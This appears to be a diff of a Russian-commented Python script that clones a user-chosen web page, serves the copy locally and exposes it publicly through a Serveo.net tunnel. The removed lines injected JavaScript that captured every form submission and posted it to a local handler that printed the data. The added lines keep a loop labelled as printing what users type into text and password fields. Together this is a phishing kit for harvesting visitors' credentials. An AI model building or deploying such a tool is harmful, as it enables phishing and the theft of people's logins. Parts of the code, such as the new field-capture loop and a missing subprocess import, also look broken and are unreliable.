@@ -4,22 +4,9 @@ import time
 import os
 from bs4 import BeautifulSoup
 from urllib.parse import urlparse, urljoin
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import socketserver
-import threading
-
-class MyRequestHandler(BaseHTTPRequestHandler):
-    def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length).decode('utf-8')
-        print("Данные из формы:", post_data)
-
-class MyServer(HTTPServer):
-    def __init__(self, server_address, handler_class):
-        super().__init__(server_address, handler_class)
 
 # Введите URL
-url = input('\nВведите URL ➤ ')
+url = input('\nВыбери URL ➤ ')
 
 # Проверяем, что URL не пустой
 if url.strip():
@@ -45,28 +32,63 @@ if url.strip():
     for tag in soup.find_all('img', {'data-src': True}):
         make_absolute_links(tag, 'data-src')
 
+    # Проверяем наличие форм для ввода данных и выводим данные, вводимые пользователями
+    forms = soup.find_all('form')
+    if forms:
+        print("Найдены формы для ввода данных.")
+        for form in forms:
+            inputs = form.find_all('input')
+            if inputs:
+                print("Найдены поля для ввода данных в форме.")
+                for inp in inputs:
+                    inp_type = inp.get('type')
+                    inp_name = inp.get('name')
+                    if inp_type in ['text', 'password']:
+                        print(f"Пользователь ввел данные в поле '{inp_name}': {inp.get('value')}")
+            else:
+                print("Форма не содержит полей для ввода данных.")
+
     # Ждем некоторое время перед сохранением HTML-кода
     time.sleep(5)
 
-    # Добавляем JavaScript для отправки данных формы на сервер и вывода в терминале
+    # Добавляем JavaScript-скрипт для обработки асинхронной загрузки изображений
     script = """
     <script>
-        setInterval(function() {
-            var forms = document.querySelectorAll('form');
-            forms.forEach(function(form) {
-                form.addEventListener('submit', function(event) {
-                    event.preventDefault();
-                    var formData = new FormData(form);
-                    fetch('/', {
-                        method: 'POST',
-                        body: formData
-                    });
-                });
+        document.addEventListener("DOMContentLoaded", function() {
+            var lazyImages = document.querySelectorAll('img[data-src]');
+            lazyImages.forEach(function(img) {
+                img.setAttribute('src', img.getAttribute('data-src'));
             });
-        }, 1000);
+        });
     </script>
     """
+
+    # Вставляем скрипт в конец HTML-страницы
     soup.body.append(BeautifulSoup(script, 'html.parser'))
+
+    # Проверяем наличие изображений на странице и сохраняем их
+    image_folder = 'images'
+    os.makedirs(image_folder, exist_ok=True)
+
+    image_paths = []
+    image_tags = soup.find_all('img')
+    for img_tag in image_tags:
+        if 'src' in img_tag.attrs:  # Проверяем наличие атрибута 'src'
+            make_absolute_links(img_tag, 'src')
+            image_url = img_tag['src']
+            image_name = os.path.basename(urlparse(image_url).path)
+            image_path = os.path.join(image_folder, image_name)
+
+            try:
+                image_content = requests.get(image_url).content
+                with open(image_path, 'wb') as image_file:
+                    image_file.write(image_content)
+                print(f"Изображение сохранено: {image_path}")
+                image_paths.append(image_path)
+            except Exception as e:
+                print(f"Ошибка при сохранении изображения {image_url}: {str(e)}")
+        else:
+            print("Тег изображения не содержит атрибута 'src'.")
 
     # Сохраняем HTML-код в файл
     file_path = 'downloaded_page.html'
@@ -75,16 +97,25 @@ if url.strip():
 
     print(f"Страница успешно скачана и сохранена в файл {file_path}")
 
-    # Запуск локального сервера для обработки данных формы
-    server_address = ('', 8000)
-    httpd = MyServer(server_address, MyRequestHandler)
-    server_thread = threading.Thread(target=httpd.serve_forever)
-    server_thread.daemon = True
-    server_thread.start()
+    # Шаг 2: Запуск локального сервера
 
+    # Создаем копию soup для сохранения в index.html
+    soup_copy = soup
+
+    # Копируем содержимое файла в файл index.html в текущей рабочей директории
+    with open('index.html', 'w', encoding='utf-8') as file:
+        file.write(str(soup_copy.prettify()))
+
+    # Выполняем команду для запуска локального сервера на порту 8000 (или другом свободном порту)
+    local_server_command = 'python -m http.server 8000'
+
+    # Запускаем команду для локального сервера с помощью subprocess
+    local_server_process = subprocess.Popen(local_server_command, shell=True, stdout=subprocess.PIPE)
+
+    # Печатаем сообщение о запуске локального сервера
     print("Локальный сервер запущен на порту 8000")
 
-    # Шаг 2: Запуск Serveo.net
+    # Шаг 3: Запуск Serveo.net
 
     # Используем оригинальную команду Serveo.net без изменений
     tru_201 = '8000'  # Замените на нужный вам порт
@@ -100,12 +131,43 @@ if url.strip():
     try:
         while True:
             time.sleep(1)
+            # Здесь можно добавить код для дополнительной обработки в реальном времени
+            # Например, мы можем выполнить проверку определенных условий или обработать другие действия
+
+            # Например, можно проверять что-то на странице в реальном времени и реагировать на это
+            # Например, выполним поиск изменений в загруженной странице и обновим соответствующие данные
+            updated_response = requests.get(url)
+            updated_html_content = updated_response.text
+            updated_soup = BeautifulSoup(updated_html_content, 'html.parser')
+
+            # Проверяем наличие форм для ввода данных и выводим данные, вводимые пользователями
+            forms = updated_soup.find_all('form')
+            if forms:
+                for form in forms:
+                    inputs = form.find_all('input')
+                    if inputs:
+                        for inp in inputs:
+                            inp_type = inp.get('type')
+                            inp_name = inp.get('name')
+                            if inp_type in ['text', 'password']:
+                                print(f"Пользователь ввел данные в поле '{inp_name}': {inp.get('value')}")
+
     except KeyboardInterrupt:
         # Прерываем выполнение при нажатии Ctrl+C
 
-        # Завершаем процессы Serveo.net и локального сервера
+        # Завершаем процессы локального сервера и Serveo.net
+        local_server_process.terminate()
         serveo_process.terminate()
-        httpd.shutdown()
-        print("Скрипт завершен.")
+
+        # Удаляем все скачанные файлы
+        if os.path.exists(image_folder):
+            for file in os.listdir(image_folder):
+                file_path = os.path.join(image_folder, file)
+                os.remove(file_path)
+            os.rmdir(image_folder)
+
+        os.system("rm -fr index.html")
+        os.system("rm -fr downloaded_page.html")
+        print("Скрипт завершен. Все скачанные файлы удалены.")
 else:
     print("Пустой URL. Пожалуйста, введите действительный URL.")
